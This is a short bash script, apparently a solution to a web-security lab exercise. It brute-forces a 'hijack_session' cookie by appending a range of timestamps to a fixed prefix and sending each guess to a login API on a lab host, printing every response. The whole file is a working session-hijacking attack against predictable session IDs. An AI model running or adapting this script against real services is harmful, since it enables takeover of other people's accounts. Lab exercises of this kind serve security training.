#!/bin/bash
for ts in {17687449638..17687449648}; do
  result=$(curl -s -X POST -b "hijack_session=8ea83252-2b65-45a6-a49-2081627-$ts" \
    http://web0x01.hbtn/api/a1/hijack_session/login)
    echo "$result : $ts"
done
